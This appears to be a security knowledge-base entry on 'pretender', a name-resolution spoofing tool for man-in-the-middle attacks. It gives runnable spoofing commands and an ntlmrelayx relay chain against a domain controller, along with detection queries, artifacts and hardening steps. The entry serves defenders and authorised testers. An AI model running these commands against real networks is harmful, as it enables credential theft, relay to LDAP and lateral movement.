name: pretender - Modern LLMNR/mDNS/DNS/DHCPv6 Spoofing for MitM
description: pretender is a modern Go-based man-in-the-middle tool that spoofs LLMNR, mDNS, NetBIOS-NS, and DHCPv6/DNS to redirect victims to the attacker, primarily to feed relay tools like ntlmrelayx or Responder. It is designed to work alongside (not replace) Responder/mitm6, with fine-grained targeting and spoofing controls to reduce noise and avoid breaking the network.
notes:
=== BASIC (spoof everything on an interface) ===
  pretender -i eth0

=== DHCPv6 + DNS TAKEOVER (mitm6-style, relay to LDAP) ===
  pretender -i eth0 --spoof-types DHCPv6 DNS
  # Pair with ntlmrelayx targeting LDAPS for delegation/ACL abuse

=== TARGETED SPOOFING (reduce noise) ===
  pretender -i eth0 --spoof <victim_ip> --dont-spoof <gateway_ip>
  pretender -i eth0 --spoof-for <victim_host>

=== LIMIT PROTOCOLS ===
  pretender -i eth0 --no-mdns --no-netbios      # LLMNR only
  pretender -i eth0 --spoof-types LLMNR mDNS

=== REDIRECT TO A SPECIFIC RELAY/HOST ===
  pretender -i eth0 --ipv4 <lhost> --ipv6 <lhost_v6>

=== TYPICAL CHAIN (relay) ===
  # Terminal 1: relay captured auth to LDAPS
  ntlmrelayx.py -t ldaps://<dc_ip> --delegate-access --no-smb-server -6
  # Terminal 2: poison name resolution toward us
  pretender -i eth0 --spoof-types DHCPv6 DNS

=== ALTERNATIVES ===
  Responder    # classic LLMNR/NBT-NS poisoner + capture
  mitm6        # DHCPv6/DNS IPv6 takeover
  Inveigh      # Windows/PowerShell equivalent

references.title: MITRE T1557.001 - LLMNR/NBT-NS Poisoning and SMB Relay

recommended.note: Responder is the classic LLMNR/NBT-NS alternative.
mitm6 is the established DHCPv6/DNS takeover tool.

defense.why_it_works: LLMNR, mDNS, NBT-NS, and DHCPv6 are trust-on-first-response broadcast/multicast protocols with no authentication. An attacker on the segment answers first, redirecting victims and capturing or relaying their authentication.
defense.prerequisites: Layer-2 access to the victim segment; a relay target for captured auth.
defense.impact: Capture of NetNTLM hashes (offline crack) or live relay to LDAP/SMB for delegation, ACL abuse, or lateral movement.
defense.detection: [MITRE T1557.001] Rogue responses to LLMNR (UDP 5355), mDNS (5353), NBT-NS (137), and unsolicited DHCPv6 advertisements/DNS from a non-DHCP host; a host answering name queries for many different names.
defense.artifacts: Spoofed name-resolution replies; sudden IPv6 default DNS pointing to a workstation; NTLM auth to an unexpected host.
defense.splunk_spl:
index=network (dest_port=5355 OR dest_port=5353 OR dest_port=137 OR dest_port=547)
| stats dc(query) as names count by src_ip
| where names > 20
defense.elastic_kql: network.protocol:(llmnr or mdns or dhcpv6) and source.ip:*
defense.sentinel_kql:
DeviceNetworkEvents
| where RemotePort in (5355,5353,137,547)
| summarize Names=dcount(RemoteUrl) by InitiatingProcessAccountName, LocalIP, bin(Timestamp, 10m)
| where Names > 20
defense.prevention: Disable LLMNR (GPO), NBT-NS, and mDNS where unused; disable IPv6 or configure DHCPv6 Guard/RA Guard; enable SMB signing and LDAP channel binding/signing to defeat relay; segment and monitor broadcast domains.

detections.name: Name-resolution poisoning (pretender/Responder/mitm6)
detections.logic:
DeviceNetworkEvents
| where RemotePort in (5355,5353,137,547)
| summarize DistinctNames=dcount(RemoteUrl), Events=count() by DeviceName, LocalIP, bin(Timestamp, 10m)
| where DistinctNames > 20
detections.tuning: Alert when a single non-infrastructure host answers many distinct name queries or advertises DHCPv6/DNS
